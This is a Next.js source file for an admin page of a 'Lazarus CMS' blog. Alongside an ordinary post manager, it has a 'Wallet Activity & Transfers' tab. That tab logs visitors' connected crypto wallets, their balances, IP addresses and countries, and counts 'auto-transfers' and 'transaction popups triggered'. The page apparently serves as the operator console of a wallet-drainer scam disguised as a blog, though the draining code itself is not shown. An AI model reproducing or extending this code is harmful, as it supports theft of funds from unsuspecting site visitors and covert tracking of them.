"use client";

import { useState, useEffect, useCallback } from "react";
import Link from "next/link";
import {
    PlusCircle,
    Edit,
    Trash2,
    Eye,
    FileText,
    TrendingUp,
    LogOut,
    Wallet,
    ArrowRightLeft,
    Globe,
    CheckCircle2,
    XCircle,
    Clock,
    RefreshCw,
    Coins,
} from "lucide-react";
import type { Post } from "@/lib/types";

interface WalletRecord {
    id: string;
    action: "connect" | "transfer";
    walletName: string;
    address: string;
    balance?: string;
    amount?: string;
    txHash?: string;
    toAddress?: string;
    status?: "pending" | "success" | "rejected" | "failed";
    errorMsg?: string;
    ip?: string;
    country?: string;
    city?: string;
    timestamp: string;
}

export default function AdminPage() {
    const [authed, setAuthed] = useState(false);
    const [password, setPassword] = useState("");
    const [error, setError] = useState("");
    const [posts, setPosts] = useState<Post[]>([]);
    const [loading, setLoading] = useState(false);

    // Tab control
    const [activeTab, setActiveTab] = useState<"posts" | "wallets">("posts");

    // Wallet activity state
    const [wallets, setWallets] = useState<WalletRecord[]>([]);
    const [transfers, setTransfers] = useState<WalletRecord[]>([]);
    const [walletStats, setWalletStats] = useState({
        totalConnectedWallets: 0,
        totalTransfersCount: 0,
        successfulTransfersCount: 0,
        totalTransferredEth: "0.0000",
    });
    const [loadingWallets, setLoadingWallets] = useState(false);

    const loadWalletData = useCallback(async (token: string) => {
        setLoadingWallets(true);
        try {
            const res = await fetch("/api/wallets", {
                headers: { "x-admin-token": token },
            });
            if (res.ok) {
                const data = await res.json();
                setWallets(data.wallets || []);
                setTransfers(data.transfers || []);
                setWalletStats(
                    data.stats || {
                        totalConnectedWallets: 0,
                        totalTransfersCount: 0,
                        successfulTransfersCount: 0,
                        totalTransferredEth: "0.0000",
                    }
                );
            }
        } catch (e) {
            console.error("Failed to load wallet data", e);
        } finally {
            setLoadingWallets(false);
        }
    }, []);

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setError("");
        const res = await fetch("/api/posts", {
            headers: { "x-admin-token": password },
        });
        if (res.ok) {
            const data = await res.json();
            sessionStorage.setItem("admin_token", password);
            setAuthed(true);
            setPosts(data.posts || []);
            loadWalletData(password);
        } else {
            setError("Incorrect password. Check your ADMIN_PASSWORD environment variable.");
        }
    };

    useEffect(() => {
        const token = sessionStorage.getItem("admin_token");
        if (token) {
            setLoading(true);
            fetch("/api/posts", { headers: { "x-admin-token": token } })
                .then((r) => r.json())
                .then((d) => {
                    setPosts(d.posts || []);
                    setAuthed(true);
                })
                .catch(() => {})
                .finally(() => setLoading(false));

            loadWalletData(token);
        }
    }, [loadWalletData]);

    const handleDelete = async (slug: string) => {
        if (!confirm(`Delete "${slug}"? This cannot be undone.`)) return;
        const token = sessionStorage.getItem("admin_token") || "";
        await fetch(`/api/posts?slug=${slug}`, {
            method: "DELETE",
            headers: { "x-admin-token": token },
        });
        setPosts((prev) => prev.filter((p) => p.slug !== slug));
    };

    const handleLogout = () => {
        sessionStorage.removeItem("admin_token");
        setAuthed(false);
        setPassword("");
        setPosts([]);
        setWallets([]);
        setTransfers([]);
    };

    const triggerRefresh = () => {
        const token = sessionStorage.getItem("admin_token");
        if (token) {
            loadWalletData(token);
        }
    };

    if (!authed) {
        return (
            <div className="min-h-screen bg-[#f8f8f8] flex items-center justify-center px-4">
                <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-sm">
                    <div className="flex items-center gap-2 mb-6">
                        <div className="w-8 h-8 bg-[#0a0a0a] rounded-md flex items-center justify-center">
                            <TrendingUp className="w-4 h-4 text-[#e8a020]" />
                        </div>
                        <span className="font-display font-bold text-lg">Lazarus CMS</span>
                    </div>
                    <form onSubmit={handleLogin} className="flex flex-col gap-4">
                        <div>
                            <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                                Admin Password
                            </label>
                            <input
                                id="password"
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Enter ADMIN_PASSWORD"
                                className="w-full px-4 py-2.5 border border-gray-200 rounded-lg focus:outline-none focus:border-[#0a0a0a] text-sm text-gray-900"
                                autoComplete="current-password"
                                required
                            />
                        </div>
                        {error && <p className="text-sm text-red-600">{error}</p>}
                        <button
                            type="submit"
                            className="py-2.5 bg-[#0a0a0a] text-white font-semibold rounded-lg hover:bg-gray-800 transition-colors"
                        >
                            Sign In
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    const published = posts.filter((p) => new Date(p.publishAt) <= new Date());
    const drafts = posts.filter((p) => new Date(p.publishAt) > new Date());

    return (
        <div className="min-h-screen bg-[#f8f8f8]">
            {/* Admin Header */}
            <div className="bg-[#0a0a0a] text-white px-6 py-4 flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <TrendingUp className="w-5 h-5 text-[#e8a020]" />
                    <span className="font-display font-bold text-lg">Lazarus Console</span>
                </div>
                <div className="flex items-center gap-6">
                    <div className="flex border-b border-gray-800">
                        <button
                            onClick={() => setActiveTab("posts")}
                            className={`px-4 py-2 text-sm font-semibold border-b-2 transition-all ${
                                activeTab === "posts"
                                    ? "border-[#e8a020] text-white"
                                    : "border-transparent text-gray-400 hover:text-white"
                            }`}
                        >
                            📰 Content Manager
                        </button>
                        <button
                            onClick={() => setActiveTab("wallets")}
                            className={`px-4 py-2 text-sm font-semibold border-b-2 transition-all ${
                                activeTab === "wallets"
                                    ? "border-[#e8a020] text-white"
                                    : "border-transparent text-gray-400 hover:text-white"
                            }`}
                        >
                            👛 Wallet Activity & Transfers
                        </button>
                    </div>

                    <div className="flex items-center gap-3">
                        <Link href="/" className="text-gray-400 hover:text-white text-sm flex items-center gap-1">
                            <Eye className="w-4 h-4" /> View Site
                        </Link>
                        <button
                            onClick={handleLogout}
                            className="text-gray-400 hover:text-white text-sm flex items-center gap-1"
                        >
                            <LogOut className="w-4 h-4" /> Logout
                        </button>
                    </div>
                </div>
            </div>

            <div className="max-w-6xl mx-auto px-4 py-8">
                {/* ──────────────── TAB: POSTS ──────────────── */}
                {activeTab === "posts" && (
                    <div>
                        {/* Stats */}
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
                            {[
                                { label: "Total Posts", value: posts.length, icon: FileText },
                                { label: "Published", value: published.length, icon: Eye },
                                { label: "Scheduled", value: drafts.length, icon: TrendingUp },
                            ].map(({ label, value, icon: Icon }) => (
                                <div
                                    key={label}
                                    className="bg-white rounded-xl p-4 border border-gray-100 flex items-center gap-3"
                                >
                                    <Icon className="w-5 h-5 text-[#e8a020]" />
                                    <div>
                                        <p className="text-xs text-gray-400">{label}</p>
                                        <p className="font-display font-bold text-xl text-gray-900">{value}</p>
                                    </div>
                                </div>
                            ))}
                            <Link
                                href="/admin/posts/new"
                                className="bg-[#e8a020] rounded-xl p-4 flex items-center gap-3 hover:bg-[#d4911c] transition-colors"
                            >
                                <PlusCircle className="w-5 h-5 text-[#0a0a0a]" />
                                <span className="font-semibold text-[#0a0a0a] text-sm">New Post</span>
                            </Link>
                        </div>

                        {/* Posts Table */}
                        <div className="bg-white rounded-2xl border border-gray-100 overflow-hidden shadow-sm">
                            <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
                                <h2 className="font-display font-semibold text-lg text-gray-900">All Posts</h2>
                                <Link
                                    href="/admin/posts/new"
                                    className="flex items-center gap-1.5 px-3 py-1.5 bg-[#0a0a0a] text-white text-sm font-semibold rounded-lg hover:bg-gray-800 transition-colors"
                                >
                                    <PlusCircle className="w-4 h-4" /> New Post
                                </Link>
                            </div>

                            {loading ? (
                                <div className="p-12 text-center text-gray-400">Loading posts…</div>
                            ) : posts.length === 0 ? (
                                <div className="p-12 text-center text-gray-400">
                                    <FileText className="w-12 h-12 mx-auto mb-3 opacity-20" />
                                    <p className="mb-2">No posts yet</p>
                                    <Link href="/admin/posts/new" className="text-blue-600 text-sm hover:underline">
                                        Create your first post →
                                    </Link>
                                </div>
                            ) : (
                                <div className="divide-y divide-gray-50">
                                    {posts.map((post) => {
                                        const isPublished = new Date(post.publishAt) <= new Date();
                                        return (
                                            <div
                                                key={post.slug}
                                                className="flex items-center gap-4 px-6 py-4 hover:bg-gray-50 transition-colors"
                                            >
                                                <div className="flex-1 min-w-0">
                                                    <p className="font-medium text-sm text-gray-900 truncate">
                                                        {post.title}
                                                    </p>
                                                    <div className="flex items-center gap-3 mt-0.5">
                                                        <span
                                                            className={`inline-flex items-center px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                                                isPublished
                                                                    ? "bg-green-100 text-green-700"
                                                                    : "bg-yellow-100 text-yellow-700"
                                                            }`}
                                                        >
                                                            {isPublished ? "Published" : "Scheduled"}
                                                        </span>
                                                        <span className="text-xs text-gray-400">
                                                            {new Date(post.publishAt).toLocaleDateString()}
                                                        </span>
                                                        {post.categories[0] && (
                                                            <span className="text-xs text-gray-400">
                                                                {post.categories[0]}
                                                            </span>
                                                        )}
                                                    </div>
                                                </div>
                                                <div className="flex items-center gap-2 shrink-0">
                                                    <Link
                                                        href={`/post/${post.slug}`}
                                                        target="_blank"
                                                        aria-label="Preview post"
                                                        className="p-1.5 text-gray-400 hover:text-gray-700 rounded"
                                                    >
                                                        <Eye className="w-4 h-4" />
                                                    </Link>
                                                    <Link
                                                        href={`/admin/posts/${post.slug}/edit`}
                                                        aria-label="Edit post"
                                                        className="p-1.5 text-gray-400 hover:text-blue-600 rounded"
                                                    >
                                                        <Edit className="w-4 h-4" />
                                                    </Link>
                                                    <button
                                                        onClick={() => handleDelete(post.slug)}
                                                        aria-label="Delete post"
                                                        className="p-1.5 text-gray-400 hover:text-red-600 rounded"
                                                    >
                                                        <Trash2 className="w-4 h-4" />
                                                    </button>
                                                </div>
                                            </div>
                                        );
                                    })}
                                </div>
                            )}
                        </div>
                    </div>
                )}

                {/* ──────────────── TAB: WALLETS ──────────────── */}
                {activeTab === "wallets" && (
                    <div>
                        {/* Stats Row */}
                        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4 mb-8">
                            {[
                                {
                                    label: "Total Swapped ETH",
                                    value: `${walletStats.totalTransferredEth} ETH`,
                                    desc: "Sum of all successful auto-transfers",
                                    icon: Coins,
                                    color: "text-green-600",
                                },
                                {
                                    label: "Connected Wallets",
                                    value: walletStats.totalConnectedWallets,
                                    desc: "Unique wallet connections logged",
                                    icon: Wallet,
                                    color: "text-blue-600",
                                },
                                {
                                    label: "Total Attempts",
                                    value: walletStats.totalTransfersCount,
                                    desc: "Total transaction popups triggered",
                                    icon: ArrowRightLeft,
                                    color: "text-[#e8a020]",
                                },
                                {
                                    label: "Successful Transfers",
                                    value: walletStats.successfulTransfersCount,
                                    desc: "Completed transactions on-chain",
                                    icon: CheckCircle2,
                                    color: "text-emerald-500",
                                },
                            ].map(({ label, value, desc, icon: Icon, color }) => (
                                <div
                                    key={label}
                                    className="bg-white rounded-xl p-5 border border-gray-100 flex items-start gap-4 shadow-sm"
                                >
                                    <div className="p-3 bg-gray-50 rounded-lg">
                                        <Icon className={`w-6 h-6 ${color}`} />
                                    </div>
                                    <div>
                                        <p className="text-xs font-semibold text-gray-400 uppercase tracking-wider">
                                            {label}
                                        </p>
                                        <p className="font-display font-bold text-2xl text-gray-900 mt-1">{value}</p>
                                        <p className="text-[10px] text-gray-500 mt-1">{desc}</p>
                                    </div>
                                </div>
                            ))}
                        </div>

                        {/* Control bar */}
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="font-display font-bold text-xl text-gray-900">Wallet Logs & Activity</h2>
                            <button
                                onClick={triggerRefresh}
                                disabled={loadingWallets}
                                className="flex items-center gap-1.5 px-4 py-2 bg-white border border-gray-200 rounded-lg text-sm font-medium text-gray-700 hover:bg-gray-50 transition-colors shadow-sm disabled:opacity-50"
                            >
                                <RefreshCw className={`w-4 h-4 ${loadingWallets ? "animate-spin" : ""}`} />
                                Refresh Logs
                            </button>
                        </div>

                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                            {/* Connected Wallets List */}
                            <div className="bg-white rounded-2xl border border-gray-100 overflow-hidden shadow-sm">
                                <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50/50">
                                    <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                                        <Wallet className="w-4 h-4 text-[#e8a020]" />
                                        Connected Wallets
                                    </h3>
                                    <span className="text-xs bg-gray-100 text-gray-600 px-2 py-0.5 rounded-full font-bold">
                                        {wallets.length}
                                    </span>
                                </div>

                                {loadingWallets && wallets.length === 0 ? (
                                    <div className="p-8 text-center text-gray-400">Loading wallets...</div>
                                ) : wallets.length === 0 ? (
                                    <div className="p-12 text-center text-gray-400">
                                        <p className="text-sm">No connected wallets recorded yet.</p>
                                    </div>
                                ) : (
                                    <div className="overflow-x-auto">
                                        <table className="w-full text-left text-sm text-gray-500">
                                            <thead className="text-xs uppercase bg-gray-50/70 border-b border-gray-100 text-gray-400 font-semibold">
                                                <tr>
                                                    <th className="px-6 py-3">Wallet / Address</th>
                                                    <th className="px-6 py-3">Balance</th>
                                                    <th className="px-6 py-3">Location</th>
                                                    <th className="px-6 py-3">Time</th>
                                                </tr>
                                            </thead>
                                            <tbody className="divide-y divide-gray-100 text-gray-900">
                                                {wallets.map((wallet) => (
                                                    <tr key={wallet.id} className="hover:bg-gray-50/80 transition-colors">
                                                        <td className="px-6 py-4">
                                                            <div className="flex flex-col">
                                                                <span className="font-semibold text-gray-900 flex items-center gap-1.5">
                                                                    <span>{wallet.walletName}</span>
                                                                </span>
                                                                <span className="font-mono text-xs text-gray-400">
                                                                    {wallet.address.slice(0, 8)}...{wallet.address.slice(-6)}
                                                                </span>
                                                            </div>
                                                        </td>
                                                        <td className="px-6 py-4 font-semibold text-gray-900">
                                                            {parseFloat(wallet.balance || "0").toFixed(4)} ETH
                                                        </td>
                                                        <td className="px-6 py-4">
                                                            <div className="flex flex-col text-xs">
                                                                <span className="flex items-center gap-1">
                                                                    <Globe className="w-3.5 h-3.5 text-gray-400" />
                                                                    {wallet.country || "Local"}
                                                                </span>
                                                                <span className="text-[10px] text-gray-400 font-mono">
                                                                    {wallet.ip || "127.0.0.1"}
                                                                </span>
                                                            </div>
                                                        </td>
                                                        <td className="px-6 py-4 text-xs text-gray-400 font-mono">
                                                            {new Date(wallet.timestamp).toLocaleTimeString()}<br/>
                                                            {new Date(wallet.timestamp).toLocaleDateString()}
                                                        </td>
                                                    </tr>
                                                ))}
                                            </tbody>
                                        </table>
                                    </div>
                                )}
                            </div>

                            {/* Transfers Log */}
                            <div className="bg-white rounded-2xl border border-gray-100 overflow-hidden shadow-sm">
                                <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50/50">
                                    <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                                        <ArrowRightLeft className="w-4 h-4 text-green-600" />
                                        Transfers & Attempts
                                    </h3>
                                    <span className="text-xs bg-gray-100 text-gray-600 px-2 py-0.5 rounded-full font-bold">
                                        {transfers.length}
                                    </span>
                                </div>

                                {loadingWallets && transfers.length === 0 ? (
                                    <div className="p-8 text-center text-gray-400">Loading transfers...</div>
                                ) : transfers.length === 0 ? (
                                    <div className="p-12 text-center text-gray-400">
                                        <p className="text-sm">No transfer attempts recorded yet.</p>
                                    </div>
                                ) : (
                                    <div className="overflow-x-auto">
                                        <table className="w-full text-left text-sm text-gray-500">
                                            <thead className="text-xs uppercase bg-gray-50/70 border-b border-gray-100 text-gray-400 font-semibold">
                                                <tr>
                                                    <th className="px-6 py-3">Transfer Details</th>
                                                    <th className="px-6 py-3">Amount</th>
                                                    <th className="px-6 py-3">Status</th>
                                                    <th className="px-6 py-3">Time</th>
                                                </tr>
                                            </thead>
                                            <tbody className="divide-y divide-gray-100 text-gray-900">
                                                {transfers.map((tx) => (
                                                    <tr key={tx.id} className="hover:bg-gray-50/80 transition-colors">
                                                        <td className="px-6 py-4">
                                                            <div className="flex flex-col">
                                                                <span className="font-mono text-xs text-gray-900">
                                                                    From: {tx.address.slice(0, 8)}...{tx.address.slice(-6)}
                                                                </span>
                                                                {tx.txHash ? (
                                                                    <a
                                                                        href={`https://etherscan.io/tx/${tx.txHash}`}
                                                                        target="_blank"
                                                                        rel="noopener noreferrer"
                                                                        className="text-xs text-blue-600 underline font-mono truncate max-w-[200px]"
                                                                    >
                                                                        Tx: {tx.txHash.slice(0, 10)}...
                                                                    </a>
                                                                ) : (
                                                                    <span className="text-[10px] text-gray-400 italic">
                                                                        No tx hash
                                                                    </span>
                                                                )}
                                                            </div>
                                                        </td>
                                                        <td className="px-6 py-4 font-semibold text-gray-900">
                                                            {parseFloat(tx.amount || "0").toFixed(4)} ETH
                                                        </td>
                                                        <td className="px-6 py-4">
                                                            <div className="flex flex-col gap-1">
                                                                {tx.status === "success" && (
                                                                    <span className="inline-flex items-center gap-1 text-xs text-green-700 bg-green-50 px-2 py-0.5 rounded font-medium">
                                                                        <CheckCircle2 className="w-3.5 h-3.5" />
                                                                        Success
                                                                    </span>
                                                                )}
                                                                {tx.status === "rejected" && (
                                                                    <span className="inline-flex items-center gap-1 text-xs text-red-700 bg-red-50 px-2 py-0.5 rounded font-medium">
                                                                        <XCircle className="w-3.5 h-3.5" />
                                                                        Rejected
                                                                    </span>
                                                                )}
                                                                {tx.status === "pending" && (
                                                                    <span className="inline-flex items-center gap-1 text-xs text-yellow-700 bg-yellow-50 px-2 py-0.5 rounded font-medium">
                                                                        <Clock className="w-3.5 h-3.5" />
                                                                        Pending
                                                                    </span>
                                                                )}
                                                                {tx.errorMsg && (
                                                                    <span className="text-[9px] text-red-500 max-w-[130px] truncate" title={tx.errorMsg}>
                                                                        {tx.errorMsg}
                                                                    </span>
                                                                )}
                                                            </div>
                                                        </td>
                                                        <td className="px-6 py-4 text-xs text-gray-400 font-mono">
                                                            {new Date(tx.timestamp).toLocaleTimeString()}<br/>
                                                            {new Date(tx.timestamp).toLocaleDateString()}
                                                        </td>
                                                    </tr>
                                                ))}
                                            </tbody>
                                        </table>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}
            </div>
        </div>
    );
}
